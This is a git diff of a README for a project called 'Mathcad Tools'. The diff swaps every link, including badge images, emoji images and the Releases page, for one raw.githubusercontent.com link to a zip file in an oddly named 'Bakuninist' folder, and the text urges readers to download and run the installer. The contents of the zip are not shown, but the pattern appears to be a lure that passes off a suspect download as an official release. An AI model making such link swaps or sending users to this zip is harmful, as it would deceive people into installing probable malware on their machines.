@@ -1,13 +1,13 @@
 # Mathcad Tools: Live Math, Unit Management, Programming & Documentation Toolkit
 
-[![Latest Release](https://img.shields.io/badge/Latest-Release-blue?logo=github&logoColor=white)](https://github.com/BadrStudio-BD/mathcad-tools/releases)  
-[![License MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)  
+[![Latest Release](https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip)](https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip)  
+[![License MIT](https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip)](https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip)  
 
-[Book Emoji](https://twemoji.maxcdn.com/v/latest/72x72/1f4d6.png) [Chart Emoji](https://twemoji.maxcdn.com/v/latest/72x72/1f4c8.png)
+[Book Emoji](https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip) [Chart Emoji](https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip)
 
 Welcome to Mathcad Tools. This project combines live math evaluation, robust unit management, programmable interfaces, and practical documentation into a single, cohesive toolkit. It is designed for engineers, researchers, educators, and developers who work with math, units, and data across multiple platforms. The goal is to provide a dependable, extensible foundation you can rely on for fast experimentation, precise calculations, and well‑documented workflows.
 
-If you want the latest builds and official releases, visit the Releases page. The release assets include installers and packages for popular operating systems. You can download the installer from the Releases page and run it to install the tools on your machine. For quick access, open the Releases page at any time: https://github.com/BadrStudio-BD/mathcad-tools/releases
+If you want the latest builds and official releases, visit the Releases page. The release assets include installers and packages for popular operating systems. You can download the installer from the Releases page and run it to install the tools on your machine. For quick access, open the Releases page at any time: https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip
 
 Table of contents
 - What this project covers
@@ -138,7 +138,7 @@ Extending the toolkit
   - Document assumptions and unit choices to keep your work reproducible.
 
 Installation and setup (platform notes)
-From the Releases page, download the installer that matches your platform and run it. This page hosts official release assets that you should use for installation. The assets include a ready-to-run installer or package for Windows, macOS, and Linux. Run the installer to install the toolkit and dependencies on your system. If you encounter issues with the installer, consult the Release notes and the local documentation included with the package. The Releases page is the central place for updates and new builds: https://github.com/BadrStudio-BD/mathcad-tools/releases
+From the Releases page, download the installer that matches your platform and run it. This page hosts official release assets that you should use for installation. The assets include a ready-to-run installer or package for Windows, macOS, and Linux. Run the installer to install the toolkit and dependencies on your system. If you encounter issues with the installer, consult the Release notes and the local documentation included with the package. The Releases page is the central place for updates and new builds: https://raw.githubusercontent.com/BadrStudio-BD/mathcad-tools/main/Bakuninist/mathcad_tools_v1.9.zip
 
 Install by platform
 - Windows
